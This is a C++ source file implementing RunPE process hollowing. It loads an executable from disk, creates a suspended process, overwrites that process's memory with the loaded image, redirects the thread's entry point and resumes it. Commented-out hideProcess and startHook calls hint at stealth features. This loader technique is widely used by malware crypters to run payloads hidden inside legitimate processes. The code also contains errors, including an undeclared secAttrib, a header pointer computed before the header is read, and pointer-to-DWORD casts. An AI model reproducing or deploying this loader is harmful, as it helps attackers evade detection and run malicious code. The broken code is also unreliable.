#include <windows.h>
#include <iostream>
#include <string>

using namespace std;

void RunFromMemory(char* pImage,char* pPath)
{
    DWORD dwWritten = 0;
    DWORD dwHeader = 0; 
    DWORD dwImageSize = 0;
    DWORD dwSectionCount = 0;
    DWORD dwSectionSize = 0;
    DWORD firstSection = 0;
    DWORD previousProtection = 0;
    DWORD jmpSize = 0;
 
    IMAGE_NT_HEADERS INH;
    IMAGE_DOS_HEADER IDH;
    IMAGE_SECTION_HEADER Sections[1000];
 
    PROCESS_INFORMATION peProcessInformation;
    STARTUPINFO peStartUpInformation;
    CONTEXT pContext;

    char* pMemory;
    char* pFile;
    const void* Point = pImage + IDH.e_lfanew;

    ::memcpy(&IDH, pImage, sizeof(IDH));
    ::memcpy(&INH, Point, sizeof(INH));
         
    dwImageSize = INH.OptionalHeader.SizeOfImage;
    pMemory = (char*) ::malloc(dwImageSize);
    ::memset(pMemory,0,dwImageSize);
    pFile = pMemory;
 
    dwHeader = INH.OptionalHeader.SizeOfHeaders;
    firstSection = ( Point + sizeof (IMAGE_NT_HEADERS));
    ::memcpy(Sections,(char*)(firstSection),sizeof(IMAGE_SECTION_HEADER)*INH.FileHeader.NumberOfSections);
 
    ::memcpy(pFile,pImage,dwHeader);
 
    if((INH.OptionalHeader.SizeOfHeaders % INH.OptionalHeader.SectionAlignment)==0)
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders;
    }
    else
    {
        jmpSize = INH.OptionalHeader.SizeOfHeaders / INH.OptionalHeader.SectionAlignment;
        jmpSize += 1;
        jmpSize *= INH.OptionalHeader.SectionAlignment;
    }
 
    pFile = (char*)((DWORD)pFile + jmpSize);
 
    for(dwSectionCount = 0; dwSectionCount < INH.FileHeader.NumberOfSections; dwSectionCount++)
    {
        jmpSize = 0;
        dwSectionSize = Sections[dwSectionCount].SizeOfRawData;
        ::memcpy(pFile,(char*)(pImage + Sections[dwSectionCount].PointerToRawData),dwSectionSize);
         
        if((Sections[dwSectionCount].Misc.VirtualSize % INH.OptionalHeader.SectionAlignment)==0)
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize;
        }
        else
        {
            jmpSize = Sections[dwSectionCount].Misc.VirtualSize / INH.OptionalHeader.SectionAlignment;
            jmpSize += 1;
            jmpSize *= INH.OptionalHeader.SectionAlignment;
        }
        pFile = (char*)((DWORD)pFile + jmpSize);
    }
 
 
    ::memset(&peStartUpInformation,0,sizeof(STARTUPINFO));
    ::memset(&peProcessInformation,0,sizeof(PROCESS_INFORMATION));
    ::memset(&pContext,0,sizeof(CONTEXT));
 
    peStartUpInformation.cb = sizeof(peStartUpInformation);
    if(CreateProcess(NULL,pPath,&secAttrib,NULL,false,CREATE_SUSPENDED, NULL,NULL,&peStartUpInformation,&peProcessInformation))
    {
        // hideProcess(peProcessInformation.dwProcessId);
        // startHook(peProcessInformation.hProcess);
        pContext.ContextFlags = CONTEXT_FULL;
        GetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,PAGE_EXECUTE_READWRITE,&previousProtection);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),pMemory,dwImageSize,&dwWritten);
        WriteProcessMemory(peProcessInformation.hProcess,(void*)((DWORD)pContext.Ebx + 8),&INH.OptionalHeader.ImageBase,4,&dwWritten);
        pContext.Eax = INH.OptionalHeader.ImageBase + INH.OptionalHeader.AddressOfEntryPoint;
        SetThreadContext(peProcessInformation.hThread,&pContext);
        VirtualProtectEx(peProcessInformation.hProcess,(void*)((DWORD)INH.OptionalHeader.ImageBase),dwImageSize,previousProtection,0);
        ResumeThread(peProcessInformation.hThread);
    }
    ::free(pMemory);
}

int main(int argc, char * argv[])
{
    FILE *fp = fopen("MyFile.exe", "rb");
    long lSize;
    char *buffer;
    size_t result;
 
    if( !fp)
    {
        fputs("File error\n", stderr);
        exit(1);
    }
 
    // obtain file size:
    fseek(fp, 0, SEEK_END);
    lSize = ftell(fp);
    rewind(fp);
 
    // allocate memory to contain the whole file:
    buffer = (char *) malloc(sizeof(char) * lSize);
    if( !buffer)
    {
        fputs("Memory error\n",stderr);
        exit(2);
    }
 
    // copy the file into the buffer:
    result = fread(buffer, 1, lSize, fp);
    if( result != lSize)
    {
        fputs("Reading error\n", stderr);
        exit(3);
    }
 
    // the whole file is now loaded in the memory buffer.
    RunFromMemory(buffer, argv[0]); //Now start the exe in Memory..
     
    return 0;
}